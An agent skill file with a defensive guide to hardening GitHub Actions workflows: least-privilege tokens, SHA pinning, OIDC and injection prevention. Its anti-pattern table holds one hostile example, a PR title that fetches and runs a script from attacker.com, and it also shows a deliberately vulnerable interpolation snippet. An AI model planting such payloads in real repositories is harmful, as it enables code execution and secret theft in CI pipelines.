---
name: github-actions-security
description: >
  Harden, audit, and secure GitHub Actions workflows and their supply chain. Use when
  setting least-privilege GITHUB_TOKEN permissions, pinning third-party actions to full
  commit SHAs, preventing script injection from untrusted event data, handling
  pull_request_target and workflow_run safely, replacing static cloud keys with OIDC,
  protecting deployments with environments, or scanning workflows with actionlint and
  zizmor. Do not use for general CI authoring with no security question, for other CI
  systems (GitLab CI, Jenkins), or for application code review (use security-code-review).
compatibility: >
  Agent Skills-compatible coding agents; actionlint or zizmor optional for executable
  validation. Action versions and SHAs in examples were read from public tag lists in
  October 2026; re-resolve SHAs yourself before committing.
metadata:
  author: michaelweissdev
  version: "1.1.0"
  tags: "github-actions, security, ci-cd, oidc, hardening, supply-chain, actionlint, devops"
  topics: "security"
---

# GitHub Actions CI/CD Security and Hardening

CI/CD automation pipelines operate with elevated privileges, possessing access to source repositories, signing keys, and cloud deployment targets. Compromised workflows can lead directly to supply-chain poisoning, credential theft, and unauthorized production modification. Securing GitHub Actions requires enforcing zero-trust default token permissions, pinning action dependencies to immutable commit hashes, neutralizing inline script injection vectors, and eliminating static cloud keys via OpenID Connect (OIDC).

Deeper material:
- [Privileged triggers, injection sinks, and OIDC troubleshooting](references/triggers-and-oidc.md)

## When to use / not use

Use when writing, reviewing, or fixing `.github/workflows/*.yml` for security. Do not use for non-security CI tuning or other CI platforms. Do not run untrusted workflows locally with real credentials (`act` executes steps on your machine).

## Purpose & Overview

This skill establishes hardening standards and defensive practices for authoring and auditing GitHub Actions workflows (`.github/workflows/*.yml`). Following these protocols ensures:
- Workflows operate under least-privilege `GITHUB_TOKEN` permissions, preventing lateral repository escalation.
- External actions cannot be hijacked via malicious upstream tag re-pointing.
- Untrusted user inputs (PR titles, issue comments, git branch names) cannot execute arbitrary shell commands.
- Cloud providers authenticate dynamically using short-lived cryptographically signed OIDC tokens.
- Workflows pass automated static security scanners (`actionlint`, `zizmor`) without warnings.

---

## Core Principles & Rules

1. **Default to Zero Permissions at Workflow Root**:
   - Always declare `permissions: {}` at the top level of the workflow file.
   - Explicitly grant only the exact permissions needed inside each individual job (e.g. `contents: read`, `id-token: write` for OIDC, `pull-requests: write` for PR comments).

2. **Pin Third-Party Actions to Full 40-Character Commit SHAs**:
   - Git tags (such as `@v4` or `@v4.1.2`) are mutable pointers that repository owners or compromised accounts can overwrite with malicious code.
   - Always pin actions to full 40-character commit hashes followed by an inline version comment:
     ```yaml
     uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0
     ```
   - Use Dependabot to automatically generate pull requests updating pinned commit hashes.

3. **Prevent Inline Script Injection**:
   - Never interpolate untrusted GitHub context expressions directly into inline shell blocks:
     ```yaml
     # VULNERABLE: Direct expression expansion into bash
     run: echo "PR title: ${{ github.event.pull_request.title }}"
     ```
   - Always assign context expressions to intermediate environment variables before referencing them in shell execution:
     ```yaml
     # SECURE: Passed via environment variable
     env:
       PR_TITLE: ${{ github.event.pull_request.title }}
     run: echo "PR title: $PR_TITLE"
     ```

4. **Eliminate Long-Lived Static Cloud Credentials**:
   - Never store `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, or GCP service account keys in repository secrets.
   - Use OpenID Connect (OIDC) federation. Configure the cloud role trust policy to validate the GitHub OIDC issuer (`https://token.actions.githubusercontent.com`), the `aud` claim, and a narrowly scoped `sub` claim.
   - The `sub` format depends on the job: a job with `environment: production` presents `repo:ORG/REPO:environment:production` (the ref is not in `sub`); a job without an environment presents `repo:ORG/REPO:ref:refs/heads/BRANCH`. Never use a wildcard that matches every repository or ref in an organization.

5. **Guard `pull_request_target` Against Untrusted Code Execution ("Pwn Request")**:
   - `pull_request_target` triggers in the context of the repository's base branch with access to repository secrets and write tokens.
   - Never check out or execute code from an untrusted fork (`ref: ${{ github.event.pull_request.head.sha }}`) inside a `pull_request_target` workflow. Keep triage, labeling, and comment notifications strictly separated from code builds.

6. **Treat every privileged trigger as hostile territory** (`pull_request_target`, `workflow_run`, `issue_comment`, `issues`, `workflow_dispatch` inputs):
   - Their event data (titles, bodies, branch names, comment text, artifact contents) is attacker-controlled even when the trigger itself is trusted.
   - Writes of untrusted values to `GITHUB_ENV`, `GITHUB_OUTPUT`, or `GITHUB_PATH` are injection sinks, as are script arguments to `actions/github-script`.
   - Artifacts and caches produced by untrusted runs are untrusted input for any privileged workflow that consumes them.

7. **Prefer a pin policy and automated updates**:
   - Enable the repository or organization setting that requires actions to be pinned to a full-length commit SHA where your plan allows it, and use Dependabot (`package-ecosystem: github-actions`) to bump pins. GitHub's hardening guide also describes workflow dependency lockfiles as the strongest option; check the current docs for availability.
   - Confirm a SHA belongs to the action's own repository, not a fork.
   - Dependabot security alerts do not cover SHA-pinned actions the same way as tags; keep the version comment accurate.

8. **Protect the workflow files themselves**: require review (CODEOWNERS) for `.github/workflows/`, restrict approval of fork workflow runs, and avoid self-hosted runners for public repositories (use ephemeral runners if unavoidable).

9. **Enforce Environment Protection Rules for Deployments**:
   - Bind all deployment jobs to a GitHub Environment (`environment: production`).
   - Require mandatory reviewer approvals, deployment branch restrictions, and environment-specific secret isolation.

---

## Standard Workflows & Procedures

### Workflow: Auditing and Hardening a Workflow File

1. **Root Permission Lock**:
   - Check if the top-level workflow defines `permissions: {}`. If absent or set broadly, reset root permissions.
2. **Action Pinning Audit**:
   - Scan all `uses:` directives. Replace tag references with corresponding commit SHAs.
3. **Injection Vector Scan**:
   - Search for `${{ ... }}` expressions inside `run:` blocks. Move every context variable to an explicit `env:` map on the step.
4. **Credential Verification**:
   - Replace any static cloud access key steps with OIDC authentication (`aws-actions/configure-aws-credentials` or `google-github-actions/auth`).
5. **Static Analysis & Linting**:
   - Run `actionlint` to verify syntax and flag deprecated or unescaped context references.
   - Run `zizmor .github/workflows/` to check for common CI/CD security vulnerabilities.

---

## Real-World Examples & Patterns

### 1. Production Hardened OIDC Deployment Workflow (`.github/workflows/deploy.yml`)

```yaml
name: Deploy Production Service

on:
  push:
    branches: [main]

# Default: Zero permissions across entire workflow
permissions: {}

concurrency:
  group: deploy-production
  cancel-in-progress: false

jobs:
  deploy:
    name: Build & Deploy via OIDC
    runs-on: ubuntu-latest
    environment: production
    timeout-minutes: 20
    permissions:
      contents: read     # To check out commit
      id-token: write    # To request GitHub OIDC JWT token
    steps:
      - name: Checkout Source Code
        uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0
        with:
          persist-credentials: false

      - name: Authenticate to AWS via OIDC
        uses: aws-actions/configure-aws-credentials@e1253824e5c10ff9df46874f81ed3ec929e19cfd # v6.3.0
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-actions-prod-deploy
          aws-region: us-east-1
          audience: sts.amazonaws.com

      - name: Deploy Application Container
        env:
          COMMIT_SHA: ${{ github.sha }}
        run: |
          echo "Deploying release for commit: $COMMIT_SHA"
          aws ecs update-service --cluster prod-cluster --service web-app --force-new-deployment
```

### 2. Script Injection Mitigation Example

```yaml
# Vulnerable vs Secure implementation for processing issue/PR comments
name: Process PR Feedback

on:
  pull_request:
    types: [opened, edited]

permissions: {}

jobs:
  validate-metadata:
    name: Validate Title and Description
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Checkout Code
        uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0
        with:
          persist-credentials: false

      # SECURE: Values mapped to environment variables
      - name: Verify PR Title Format
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
          PR_BODY: ${{ github.event.pull_request.body }}
        run: |
          # Bash variables are safely evaluated without shell injection
          if [[ ! "$PR_TITLE" =~ ^(feat|fix|chore|docs|refactor)(\(.*\))?:[[:space:]].+ ]]; then
            echo "Error: PR title does not adhere to Conventional Commits format."
            exit 1
          fi
          echo "PR Title validated successfully."
```

### 3. AWS IAM Role Trust Policy for GitHub Actions OIDC

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "GitHubActionsOIDCAuth",
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        },
        "StringLike": {
          "token.actions.githubusercontent.com:sub": "repo:my-org/my-repository:environment:production"
        }
      }
    }
  ]
}
```

---

## Common Anti-Patterns & Pitfalls

| Anti-Pattern | Security Risk | Production Hardening Fix |
| :--- | :--- | :--- |
| **Default `write-all` permissions** | Breached dependencies or injected scripts inherit administrative write access across the repo. | Set top-level `permissions: {}` and explicitly declare minimal scopes per job. |
| **Referencing actions by tag (`@v1`)** | Tag hijacking allows upstream attackers to push arbitrary malicious code directly into your CI runner. | Pin actions to full 40-character SHA digests with Dependabot version update automation. |
| **Interpolating context into `run:` scripts** | Malicious pull request title (e.g. `$(curl attacker.com/exploit.sh \| bash)`) executes arbitrary code. | Map context values into `env:` variables and reference them as shell variables (`$VAR`). |
| **Checking out PR code in `pull_request_target`** | Untrusted fork code executes in privileged workflow context with access to all secrets ("Pwn Request"). | Use `pull_request` event for building fork code, or never check out PR head code in `pull_request_target`. |
| **Permanent AWS / GCP keys in Secrets** | Static credentials cannot be automatically rotated, lack identity boundaries, and leak easily in debug outputs. | Transition cloud authentication to short-lived OIDC tokens using `id-token: write`. |
| **Leaving `persist-credentials: true`** | Leaves Git credentials on disk in `.git/config`, enabling rogue build scripts to push to the repository. | Explicitly pass `with: persist-credentials: false` to `actions/checkout`. |

---

## Verification Checklist

When authoring or auditing GitHub Actions workflow configurations, verify every checkpoint:

- [ ] **Top-Level Permissions**: Workflow explicitly defines `permissions: {}` at root.
- [ ] **Job Least-Privilege**: Each job declares only the minimal permissions required (`contents: read`, etc.).
- [ ] **Commit SHA Pinning**: All third-party `uses:` statements reference 40-character commit hashes with descriptive comments.
- [ ] **Script Injection Proofing**: Zero direct `${{ ... }}` expressions are present inside `run:` strings; all dynamic context is passed via `env:`.
- [ ] **OIDC Federation**: Cloud access uses OIDC (`id-token: write`) rather than long-lived API keys.
- [ ] **Checkout Isolation**: `actions/checkout` specifies `with: persist-credentials: false`.
- [ ] **Execution Limits**: Every job specifies an explicit `timeout-minutes:` limit to prevent runner hang resource exhaustion.
- [ ] **Concurrency Cancellation**: Workflows handling pull requests declare a `concurrency` block with `cancel-in-progress: true`.
- [ ] **Privileged Triggers**: No untrusted checkout, artifact, or cache use in `pull_request_target` / `workflow_run` jobs that hold secrets or write tokens.
- [ ] **OIDC Trust Policy**: `aud` and `sub` are pinned to the exact repository and environment or ref.
- [ ] **Workflow Ownership**: `.github/workflows/` is covered by CODEOWNERS; Dependabot updates action pins.
- [ ] **Static Security Tooling**: Workflow validates cleanly against `actionlint` and passes `zizmor` security checks.

---

## Tooling & Reference Guides

- **Validation & Linting Commands**:
  ```bash
  # Validate syntax and detect unescaped injection vectors
  actionlint .github/workflows/*.yml
  
  # Audit workflows for CI/CD security vulnerabilities
  zizmor .github/workflows/
  ```
- **Local Runner Execution**:
  ```bash
  # Test workflows locally with nektos/act
  act pull_request
  ```
- **Runtime Sandboxing**:
  - [StepSecurity Harden-Runner](https://github.com/step-security/harden-runner) (Network egress filtering and file integrity monitoring)
- **Official Documentation**:
  - [GitHub Actions Security Hardening Guide](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
  - [Configuring OpenID Connect in Cloud Providers](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)
  - [Actionlint Syntax & Linter Reference](https://github.com/rhysd/actionlint)
